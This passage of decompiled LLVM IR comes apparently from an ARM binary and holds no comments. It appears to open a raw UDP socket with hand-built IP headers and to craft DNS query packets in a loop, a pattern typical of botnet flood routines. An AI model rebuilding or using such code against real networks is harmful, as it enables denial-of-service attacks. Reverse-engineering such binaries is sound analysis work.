  %v4_c324 = call i32 @function_1066c(i8* %v3_c324, i32 %v0_c318, i32 %v3_c314)
  store i32 %v4_c324, i32* @r6, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_c330 = call i32 @function_fcc4(i32 25)
  store i32 %v1_c330, i32* %r0.global-to-local, align 4
  %v0_c334 = load i32, i32* @r6, align 4
  %v7_c334 = icmp eq i32 %v0_c334, -1
  store i1 %v7_c334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c334, label %dec_label_pc_c7d0, label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_c2e0
  %v0_c33c = load i32, i32* @r5, align 4
  %v9_c33c = icmp eq i32 %v0_c33c, %v0_c334
  store i1 %v9_c33c, i1* %cpsr_z.global-to-local, align 1
  %v7_c340 = icmp sgt i32 %v0_c33c, %v0_c334
  br i1 %v7_c340, label %dec_label_pc_c344, label %dec_label_pc_c7d0

dec_label_pc_c344:                                ; preds = %dec_label_pc_c33c
  %v0_c344 = load i32, i32* @sl, align 4
  %v2_c344 = add i32 %v0_c344, %v0_c334
  store i32 %v2_c344, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c370 = add i32 %v0_c33c, -1
  br label %dec_label_pc_c368

dec_label_pc_c354:                                ; preds = %dec_label_pc_c390, %bb103
  %v9_c354 = icmp eq i32 %v1_c370, %v0_c35c
  store i1 %v9_c354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c354, label %dec_label_pc_c39c, label %dec_label_pc_c35c

dec_label_pc_c35c:                                ; preds = %dec_label_pc_c380, %dec_label_pc_c354, %bb
  %v0_c38c29 = phi i32 [ %v0_c38c, %dec_label_pc_c380 ], [ %v0_c38c30, %dec_label_pc_c354 ], [ %v0_c38c, %bb ]
  %v0_c36c25 = phi i32 [ 0, %dec_label_pc_c380 ], [ %v0_c36c26, %dec_label_pc_c354 ], [ 0, %bb ]
  %v1_c35c = add i32 %v0_c35c, 1
  %v9_c360 = icmp eq i32 %v1_c35c, %v0_c33c
  store i1 %v9_c360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c360, label %dec_label_pc_c7d0, label %dec_label_pc_c368

dec_label_pc_c368:                                ; preds = %dec_label_pc_c35c, %dec_label_pc_c344
  %v0_c35c = phi i32 [ %v1_c35c, %dec_label_pc_c35c ], [ %v0_c334, %dec_label_pc_c344 ]
  %v0_c38c = phi i32 [ %v0_c38c29, %dec_label_pc_c35c ], [ 0, %dec_label_pc_c344 ]
  %v0_c36c = phi i32 [ %v0_c36c25, %dec_label_pc_c35c ], [ 0, %dec_label_pc_c344 ]
  %v0_c374 = phi i32 [ %v1_c374, %dec_label_pc_c35c ], [ %v2_c344, %dec_label_pc_c344 ]
  %v1_c368 = inttoptr i32 %v0_c374 to i8*
  %v2_c368 = load i8, i8* %v1_c368, align 1
  %v3_c368 = zext i8 %v2_c368 to i32
  store i32 %v3_c368, i32* %r3.global-to-local, align 4
  %v2_c36c = icmp eq i32 %v0_c36c, 0
  store i1 %v2_c36c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v1_c374 = add i32 %v0_c374, 1
  store i32 %v1_c374, i32* %r2.global-to-local, align 4
  %v1_c378 = add nsw i32 %v3_c368, -48
  store i32 %v1_c378, i32* %r1.global-to-local, align 4
  br i1 %v2_c36c, label %dec_label_pc_c380, label %dec_label_pc_c390

dec_label_pc_c380:                                ; preds = %dec_label_pc_c368
  %v7_c380 = icmp eq i8 %v2_c368, 9
  store i1 %v7_c380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c380, label %dec_label_pc_c35c, label %bb

bb:                                               ; preds = %dec_label_pc_c380
  %v8_c384 = icmp eq i8 %v2_c368, 32
  store i1 %v8_c384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c384, label %dec_label_pc_c35c, label %dec_label_pc_c38c

dec_label_pc_c38c:                                ; preds = %bb
  %v1_c38c = add i32 %v0_c38c, 1
  store i32 %v1_c38c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c390

dec_label_pc_c390:                                ; preds = %dec_label_pc_c368, %dec_label_pc_c38c
  %v0_c38c30 = phi i32 [ %v0_c38c, %dec_label_pc_c368 ], [ %v1_c38c, %dec_label_pc_c38c ]
  %v0_c36c26 = phi i32 [ %v0_c36c, %dec_label_pc_c368 ], [ %v1_c38c, %dec_label_pc_c38c ]
  %v7_c390 = icmp eq i8 %v2_c368, 46
  store i1 %v7_c390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c390, label %dec_label_pc_c354, label %bb103

bb103:                                            ; preds = %dec_label_pc_c390
  %v8_c394 = icmp eq i32 %v1_c378, 9
  store i1 %v8_c394, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c378, 10
  br i1 %tmp, label %dec_label_pc_c354, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c354, %bb103
  %v0_c35c.lcssa = phi i32 [ %v1_c370, %dec_label_pc_c354 ], [ %v0_c35c, %bb103 ]
  %v2_c3a0 = sub i32 %v0_c35c.lcssa, %v0_c334
  store i32 %v2_c3a0, i32* @r4, align 4
  %v2_c3a4 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c344, i32* %r1.global-to-local, align 4
  store i32 %v2_c3a4, i32* %r0.global-to-local, align 4
  store i32 %v2_c3a0, i32* %r2.global-to-local, align 4
  %v3_c3b4 = call i32 @function_1038c(i32 %v2_c3a4, i32 %v2_c344, i32 %v2_c3a0)
  %v2_c3b8 = ptrtoint i32* %stack_var_-40 to i32
  %v1_c3bc = load i32, i32* @r4, align 4
  %v2_c3bc = add i32 %v1_c3bc, %v2_c3b8
  store i32 %v2_c3bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3a4, i32* @r0, align 4
  %v3_c3c8 = add i32 %v2_c3bc, -36
  %v4_c3c8 = inttoptr i32 %v3_c3c8 to i8*
  store i8 0, i8* %v4_c3c8, align 1
  %v1_c3cc = call i32 @function_11344(i32 %v2_c3a4)
  store i32 %v1_c3cc, i32* %r0.global-to-local, align 4
  store i32 %v1_c3cc, i32* @fp, align 4
  br label %dec_label_pc_c3d4

dec_label_pc_c3d49:                               ; preds = %dec_label_pc_c7d0
  unreachable

dec_label_pc_c3d4:                                ; preds = %dec_label_pc_c838, %dec_label_pc_c82c, %dec_label_pc_c81c, %dec_label_pc_c80c, %dec_label_pc_c39c
  %v1_c80849 = phi i32 [ %v1_c7d4, %dec_label_pc_c838 ], [ %v1_c7d4, %dec_label_pc_c82c ], [ %v1_c7d4, %dec_label_pc_c81c ], [ %v1_c7d4, %dec_label_pc_c80c ], [ %v1_c3cc, %dec_label_pc_c39c ]
  %v0_c3d4 = load i32, i32* @r7, align 4
  %v2_c3d4 = icmp eq i32 %v0_c3d4, 0
  store i1 %v2_c3d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c3d4, label %dec_label_pc_c7fc, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %dec_label_pc_c3d4
  store i32 %v0_c3d4, i32* %r0.global-to-local, align 4
  %v1_c3e0 = inttoptr i32 %v0_c3d4 to i8*
  %v2_c3e0 = call i32 @function_1031c(i8* %v1_c3e0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e0, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c3f4 = call i32 @function_115f4(i32 2, i32 3, i32 17)
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v7_c3f8 = icmp eq i32 %v3_c3f4, -1
  store i1 %v7_c3f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3f8, label %dec_label_pc_c7fc, label %dec_label_pc_c404

dec_label_pc_c404:                                ; preds = %dec_label_pc_c3dc
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c40c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c40c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c420 = call i32 @function_115b0(i32 %v3_c3f4, i32 0, i32 3, i32 %v6_c40c, i32 4)
  store i32 %v5_c420, i32* %r0.global-to-local, align 4
  %v7_c424 = icmp eq i32 %v5_c420, -1
  store i1 %v7_c424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c424, label %dec_label_pc_c7f4, label %dec_label_pc_c42c

dec_label_pc_c42c:                                ; preds = %dec_label_pc_c404
  %v0_c434 = load i32, i32* %sb.global-to-local, align 4
  %v1_c434 = urem i32 %v0_c434, 256
  store i32 %v1_c434, i32* %sb.global-to-local, align 4
  %v3_c43c = mul i32 %v6_c244, 65536
  store i32 %v3_c43c, i32* %r3.global-to-local, align 4
  %v5_c448 = trunc i32 %v0_c434 to i8
  %v0_c44c = load i32, i32* @r8, align 4
  %v2_c44c = icmp eq i32 %v0_c44c, 0
  store i1 %v2_c44c, i1* %cpsr_z.global-to-local, align 1
  %v3_c450 = urem i32 %v7_c1e8, 65536
  store i32 %v3_c450, i32* %r0.global-to-local, align 4
  %v3_c458 = urem i32 %v6_c244, 65536
  store i32 %v3_c458, i32* %r2.global-to-local, align 4
  %v3_c45c = mul i32 %v6_c25c, 65536
  %v3_c460 = mul i32 %v6_c278, 65536
  store i32 %v3_c460, i32* %ip.global-to-local, align 4
  br i1 %v2_c44c, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_c42c
  %v5_c468 = sext i8 %v5_c448 to i32
  store i32 %v5_c468, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_c42c, %bb104
  %v2_c494 = phi i32 [ %v3_c458, %dec_label_pc_c42c ], [ %v5_c468, %bb104 ]
  %v3_c474 = urem i32 %v6_c25c, 65536
  store i32 %v3_c474, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c47c = urem i32 %v6_c278, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c494 = load i32, i32* @r6, align 4
  br i1 %v2_c44c, label %.dec_label_pc_c67c.preheader_crit_edge, label %dec_label_pc_c49c

.dec_label_pc_c67c.preheader_crit_edge:           ; preds = %bb105
  %v3_c494 = add i32 %v1_c494, %v2_c494
  store i32 %v3_c494, i32* @r7, align 4
  %.pre = sext i8 %v5_c448 to i32
  br label %dec_label_pc_c67c.preheader

dec_label_pc_c49c:                                ; preds = %bb105
  %v2_c49c = add i32 %v1_c494, %v1_c434
  %v3_c4a0 = mul i32 %v2_c49c, 65536
  %v1_c4a8 = add i32 %v3_c4a0, 1769472
  %v1_c4ac = add i32 %v3_c4a0, 3080192
  %tmp106 = udiv i32 %v1_c4ac, 256
  %v3_c4c0 = and i32 %tmp106, 65280
  %v4_c4d0 = udiv i32 %v1_c4ac, 16777216
  %v5_c4d0 = or i32 %v3_c4c0, %v4_c4d0
  store i32 %v5_c4d0, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_c244 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_c1e8, 256
  %v3_c4e4 = and i32 %tmp107, 65280
  store i32 %v3_c4e4, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_c1e8, 256
  %v4_c4e8 = urem i32 %tmp108, 256
  %v5_c4e8 = or i32 %v4_c4e8, %v3_c4e4
  store i32 %v5_c4e8, i32* @sb, align 4
  store i32 %v3_c460, i32* %r2.global-to-local, align 4
  store i32 %v3_c45c, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_c25c, 256
  %v3_c4fc = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_c278, 256
  %v3_c500 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_c4a8, 256
  %v3_c504 = and i32 %tmp111, 65280
  store i32 %v3_c504, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_c25c, 256
  %v4_c508 = urem i32 %tmp112, 256
  %v5_c508 = or i32 %v4_c508, %v3_c4fc
  store i32 %v5_c508, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_c278, 256
  %v4_c50c = urem i32 %tmp113, 256
  %v5_c50c = or i32 %v4_c50c, %v3_c500
  store i32 %v5_c50c, i32* @r4, align 4
  %v1_c510 = add i32 %v1_c494, 1
  store i32 %v1_c510, i32* %r3.global-to-local, align 4
  %v4_c514 = udiv i32 %v1_c4a8, 16777216
  %v5_c514 = or i32 %v4_c514, %tmp111
  store i32 0, i32* @r5, align 4
  %v4_c598 = sext i8 %v5_c448 to i32
  %sext = mul nuw i32 %v5_c508, 65536
  %v7_c5ac = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c50c, 65536
  %v4_c5d4 = sdiv i32 %sext8, 65536
  %v1_c574 = trunc i32 %v5_c1e8 to i8
  %extract.t = trunc i32 %v5_c220 to i8
  %v1_c59c = add nsw i32 %v4_c598, 41
  %sext120 = mul i32 %v5_c514, 65536
  %v3_c5ac = sdiv i32 %sext120, 65536
  br label %dec_label_pc_c52c

dec_label_pc_c52c:                                ; preds = %dec_label_pc_c64c, %dec_label_pc_c49c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c534 = call i32 @function_1215c(i32 600, i32 1)
  store i32 %v2_c534, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ac, i32* %ip.global-to-local, align 4
  %v3_c53c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c53c, i32* %r3.global-to-local, align 4
  %v2_c540 = load i32, i32* @r5, align 4
  %v5_c540 = mul i32 %v2_c540, 4
  %v6_c540 = add i32 %v5_c540, %v2_c1ac
  %v7_c540 = inttoptr i32 %v6_c540 to i32*
  store i32 %v2_c534, i32* %v7_c540, align 4
  %v0_c544 = load i32, i32* %ip.global-to-local, align 4
  %v1_c544 = load i32, i32* %r3.global-to-local, align 4
  %v4_c544 = mul i32 %v1_c544, 4
  %v5_c544 = add i32 %v4_c544, %v0_c544
  %v6_c544 = inttoptr i32 %v5_c544 to i32*
  %v7_c544 = load i32, i32* %v6_c544, align 4
  store i32 %v7_c544, i32* %r1.global-to-local, align 4
  %v1_c548 = inttoptr i32 %v7_c544 to i8*
  %v2_c548 = load i8, i8* %v1_c548, align 1
  %tmp127 = urem i8 %v2_c548, 16
  %v1_c54c = zext i8 %tmp127 to i32
  %v1_c550 = or i32 %v1_c54c, 64
  store i32 %v1_c550, i32* %r2.global-to-local, align 4
  %v1_c554 = trunc i32 %v1_c550 to i8
  store i8 %v1_c554, i8* %v1_c548, align 1
  %v0_c558 = load i32, i32* %r1.global-to-local, align 4
  %v1_c558 = inttoptr i32 %v0_c558 to i8*
  %v2_c558 = load i8, i8* %v1_c558, align 1
  %v3_c558 = zext i8 %v2_c558 to i32
  %v1_c55c = and i32 %v3_c558, 240
  %v1_c560 = or i32 %v1_c55c, 5
  store i32 %v1_c560, i32* %r3.global-to-local, align 4
  store i32 %v1_c22c, i32* %lr.global-to-local, align 4
  %v1_c568 = trunc i32 %v1_c560 to i8
  store i8 %v1_c568, i8* %v1_c558, align 1
  store i32 %v5_c1e8, i32* %r0.global-to-local, align 4
  %v0_c570 = load i32, i32* %lr.global-to-local, align 4
  %v2_c570 = icmp eq i32 %v0_c570, 0
  store i1 %v2_c570, i1* %cpsr_z.global-to-local, align 1
  %v2_c574 = load i32, i32* %r1.global-to-local, align 4
  %v3_c574 = add i32 %v2_c574, 1
  %v4_c574 = inttoptr i32 %v3_c574 to i8*
  store i8 %v1_c574, i8* %v4_c574, align 1
  store i32 %v5_c220, i32* %r2.global-to-local, align 4
  %v0_c57c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c57c, label %.thread11, label %bb114

bb114:                                            ; preds = %dec_label_pc_c52c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c580 = load i32, i32* %r1.global-to-local, align 4
  %v4_c580 = add i32 %v3_c580, 6
  %v5_c580 = inttoptr i32 %v4_c580 to i16*
  store i16 64, i16* %v5_c580, align 2
  %v0_c588.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_c588.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c52c, %bb114
  %v0_c588.off0 = phi i8 [ %extract.t, %dec_label_pc_c52c ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c588 = load i32, i32* %r1.global-to-local, align 4
  %v3_c588 = add i32 %v2_c588, 8
  %v4_c588 = inttoptr i32 %v3_c588 to i8*
  store i8 %v0_c588.off0, i8* %v4_c588, align 1
  %v0_c58c = load i32, i32* %r3.global-to-local, align 4
  %v1_c58c = trunc i32 %v0_c58c to i8
  %v2_c58c = load i32, i32* %r1.global-to-local, align 4
  %v3_c58c = add i32 %v2_c58c, 9
  %v4_c58c = inttoptr i32 %v3_c58c to i8*
  store i8 %v1_c58c, i8* %v4_c58c, align 1
  %v2_c594 = load i32, i32* @global_var_20a5c.46, align 4
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v2_c5a0 = add i32 %v1_c59c, %v0_c59c
  store i32 %v2_c5a0, i32* @r4, align 4
  %v2_c5a4 = add i32 %v0_c59c, 12
  %v3_c5a4 = inttoptr i32 %v2_c5a4 to i32*
  store i32 %v2_c594, i32* %v3_c5a4, align 4
  store i32 %v3_c5ac, i32* %r2.global-to-local, align 4
  store i32 %v7_c5ac, i32* %r3.global-to-local, align 4
  %v0_c5b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5b0 = add i32 %v0_c5b0, 20
  store i32 %v1_c5b0, i32* %ip.global-to-local, align 4
  %v0_c5b4 = load i32, i32* @sl, align 4
  %v1_c5b4 = trunc i32 %v0_c5b4 to i16
  %v3_c5b4 = add i32 %v0_c5b0, 2
  %v4_c5b4 = inttoptr i32 %v3_c5b4 to i16*
  store i16 %v1_c5b4, i16* %v4_c5b4, align 2
  %v0_c5b8 = load i32, i32* @sb, align 4
  %v1_c5b8 = trunc i32 %v0_c5b8 to i16
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 4
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i16*
  store i16 %v1_c5b8, i16* %v4_c5b8, align 2
  %v0_c5bc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5bc = trunc i32 %v0_c5bc to i16
  %v2_c5bc = load i32, i32* %ip.global-to-local, align 4
  %v3_c5bc = add i32 %v2_c5bc, 4
  %v4_c5bc = inttoptr i32 %v3_c5bc to i16*
  store i16 %v1_c5bc, i16* %v4_c5bc, align 2
  %v0_c5c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5c0 = trunc i32 %v0_c5c0 to i16
  %v2_c5c0 = load i32, i32* %ip.global-to-local, align 4
  %v3_c5c0 = add i32 %v2_c5c0, 2
  %v4_c5c0 = inttoptr i32 %v3_c5c0 to i16*
  store i16 %v1_c5c0, i16* %v4_c5c0, align 2
  %v2_c5c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5c8 = add i32 %v2_c5c8, 20
  %v4_c5c8 = inttoptr i32 %v3_c5c8 to i16*
  store i16 %rev, i16* %v4_c5c8, align 2
  store i32 %v4_c598, i32* %ip.global-to-local, align 4
  %v0_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5d0 = add i32 %v0_c5d0, 28
  store i32 %v1_c5d0, i32* %r0.global-to-local, align 4
  store i32 %v4_c5d4, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c5e0 = add i32 %v0_c5d0, 30
  %v4_c5e0 = inttoptr i32 %v3_c5e0 to i16*
  store i16 1, i16* %v4_c5e0, align 2
  %v0_c5e4 = load i32, i32* @lr, align 4
  %v1_c5e4 = trunc i32 %v0_c5e4 to i16
  %v2_c5e4 = load i32, i32* %r0.global-to-local, align 4
  %v3_c5e4 = add i32 %v2_c5e4, 4
  %v4_c5e4 = inttoptr i32 %v3_c5e4 to i16*
  store i16 %v1_c5e4, i16* %v4_c5e4, align 2
  %v0_c5e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_c5e8 = trunc i32 %v0_c5e8 to i8
  %v2_c5e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5e8 = add i32 %v2_c5e8, 40
  %v4_c5e8 = inttoptr i32 %v3_c5e8 to i8*
  store i8 %v1_c5e8, i8* %v4_c5e8, align 1
  %v0_c5ec = load i32, i32* @fp, align 4
  %v1_c5ec = load i32, i32* %r1.global-to-local, align 4
  %v2_c5ec = add i32 %v1_c5ec, 16
  %v3_c5ec = inttoptr i32 %v2_c5ec to i32*
  store i32 %v0_c5ec, i32* %v3_c5ec, align 4
  %v0_c5f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5f0 = trunc i32 %v0_c5f0 to i16
  %v2_c5f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5f0 = add i32 %v2_c5f0, 28
  %v4_c5f0 = inttoptr i32 %v3_c5f0 to i16*
  store i16 %v1_c5f0, i16* %v4_c5f0, align 2
  %v0_c5f4 = load i32, i32* @r4, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 1
  store i32 %v1_c5f4, i32* %r0.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @r7, align 4
  store i32 %v0_c5f8, i32* %r1.global-to-local, align 4
  store i32 %v1_c510, i32* %r2.global-to-local, align 4
  %v3_c600 = call i32 @function_1038c(i32 %v1_c5f4, i32 %v0_c5f8, i32 %v1_c510)
  store i32 %v3_c600, i32* %r0.global-to-local, align 4
  %v0_c604 = load i32, i32* @r6, align 4
  %v2_c604 = icmp eq i32 %v0_c604, 0
  store i1 %v2_c604, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_c604, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_c614

bb116:                                            ; preds = %.thread11
  %v5_c608 = load i32, i32* @r4, align 4
  store i32 %v5_c608, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c64c

dec_label_pc_c614:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_c618 = load i32, i32* @r4, align 4
  store i32 %v0_c618, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c620

dec_label_pc_c620:                                ; preds = %.thread18, %dec_label_pc_c614
  %v0_c62c = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c614 ]
  %v0_c630 = phi i32 [ %v0_c644, %.thread18 ], [ 0, %dec_label_pc_c614 ]
  %v1_c620 = load i32, i32* @r7, align 4
  %v2_c620 = add i32 %v1_c620, %v0_c630
  %v3_c620 = inttoptr i32 %v2_c620 to i8*
  %v4_c620 = load i8, i8* %v3_c620, align 1
  %v6_c620 = zext i8 %v4_c620 to i32
  store i32 %v6_c620, i32* %r3.global-to-local, align 4
  %v7_c624 = icmp eq i8 %v4_c620, 46
  store i1 %v7_c624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c624, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_c620
  %v1_c62c14 = add nsw i32 %v0_c62c, 1
  store i32 %v1_c62c14, i32* %r2.global-to-local, align 4
  %v1_c63016 = add i32 %v0_c630, 1
  store i32 %v1_c63016, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_c620
  %v2_c628 = load i32, i32* @r4, align 4
  %v3_c628 = add i32 %v2_c628, %v0_c630
  store i32 %v3_c628, i32* %r3.global-to-local, align 4
  %v1_c62c = add nsw i32 %v0_c62c, 1
  store i32 %v1_c62c, i32* %r2.global-to-local, align 4
  %v1_c630 = add i32 %v0_c630, 1
  store i32 %v1_c630, i32* %r1.global-to-local, align 4
  %v2_c634 = trunc i32 %v0_c62c to i8
  %v3_c634 = load i32, i32* %r0.global-to-local, align 4
  %v4_c634 = inttoptr i32 %v3_c634 to i8*
  store i8 %v2_c634, i8* %v4_c634, align 1
  %v0_c638.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c638.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_c638.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_c638 = phi i32 [ %v1_c638.pre, %bb117.bb118_crit_edge ], [ %v1_c62c14, %.thread59 ]
  %v2_c638 = urem i32 %v1_c638, 256
  br label %.thread18

bb119:                                            ; preds = %bb117
  %v1_c63c = load i32, i32* %r3.global-to-local, align 4
  %v2_c63c = add i32 %v1_c63c, 1
  store i32 %v2_c63c, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_c638, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c644 = load i32, i32* %r1.global-to-local, align 4
  %v1_c644 = load i32, i32* @r6, align 4
  %v9_c644 = icmp eq i32 %v0_c644, %v1_c644
  store i1 %v9_c644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c644, label %dec_label_pc_c64c.loopexit, label %dec_label_pc_c620

dec_label_pc_c64c.loopexit:                       ; preds = %.thread18
  %v2_c64c.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c64c

dec_label_pc_c64c:                                ; preds = %bb116, %dec_label_pc_c64c.loopexit
  %v0_c64c.off0 = phi i8 [ %extract.t126, %dec_label_pc_c64c.loopexit ], [ 0, %bb116 ]
  %v2_c64c = phi i32 [ %v2_c64c.pre, %dec_label_pc_c64c.loopexit ], [ %v5_c608, %bb116 ]
  %v3_c64c = inttoptr i32 %v2_c64c to i8*
  store i8 %v0_c64c.off0, i8* %v3_c64c, align 1
  %v3_c650 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = add i32 %v3_c650, 1
  store i32 %v1_c654, i32* @r5, align 4
  %v0_c658 = load i32, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r6, align 4
  %v2_c658 = add i32 %v1_c658, %v0_c658
  store i32 %v2_c658, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c660 = load i32, i32* @r8, align 4
  %v9_c660 = icmp eq i32 %v0_c660, %v1_c654
  store i1 %v9_c660, i1* %cpsr_z.global-to-local, align 1
  %v3_c664 = add i32 %v2_c658, 4
  %v4_c664 = inttoptr i32 %v3_c664 to i16*
  store i16 256, i16* %v4_c664, align 2
  %v0_c668 = load i32, i32* @lr, align 4
  %v1_c668 = trunc i32 %v0_c668 to i16
  %v2_c668 = load i32, i32* %r2.global-to-local, align 4
  %v3_c668 = add i32 %v2_c668, 2
  %v4_c668 = inttoptr i32 %v3_c668 to i16*
  store i16 %v1_c668, i16* %v4_c668, align 2
  %v0_c66c = load i32, i32* @r5, align 4
  store i32 %v0_c66c, i32* %stack_var_-44, align 4
  %v8_c670 = icmp sgt i32 %v0_c660, %v1_c654
  br i1 %v8_c670, label %dec_label_pc_c52c, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c64c
  store i32 %v4_c598, i32* %r0.global-to-local, align 4
  %v0_c678 = load i32, i32* @r6, align 4
  %v2_c678 = add i32 %v0_c678, %v4_c598
  store i32 %v2_c678, i32* @r7, align 4
  %v0_c680.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c67c.preheader

dec_label_pc_c67c.preheader:                      ; preds = %.dec_label_pc_c67c.preheader_crit_edge, %dec_label_pc_c674
  %v4_c6e0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c67c.preheader_crit_edge ], [ %v4_c598, %dec_label_pc_c674 ]
  %v0_c680.pre = phi i32 [ 0, %.dec_label_pc_c67c.preheader_crit_edge ], [ %v0_c680.pre.pre, %dec_label_pc_c674 ]
  %v3_c6ac = icmp eq i32 %v3_c450, 65535
  %v3_c6bc = icmp eq i32 %v3_c458, 65535
  br label %dec_label_pc_c67c

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c774, %dec_label_pc_c67c.preheader
  %v0_c680 = phi i32 [ %v0_c680.pre, %dec_label_pc_c67c.preheader ], [ 0, %dec_label_pc_c774 ], [ 0, %dec_label_pc_c67c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c680 = icmp eq i32 %v0_c680, 0
  store i1 %v2_c680, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c680, label %dec_label_pc_c67c, label %dec_label_pc_c68c

dec_label_pc_c68c:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c774
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c690 = load i32, i32* @r7, align 4
  %v1_c690 = add i32 %v0_c690, 27
  store i32 %v1_c690, i32* @sb, align 4
  %v1_c694 = add i32 %v0_c690, 47
  store i32 %v1_c694, i32* @sl, align 4
  br label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c6dc, %dec_label_pc_c68c
  %v1_c6a4 = phi i32 [ %v1_c764, %dec_label_pc_c6dc ], [ 0, %dec_label_pc_c68c ]
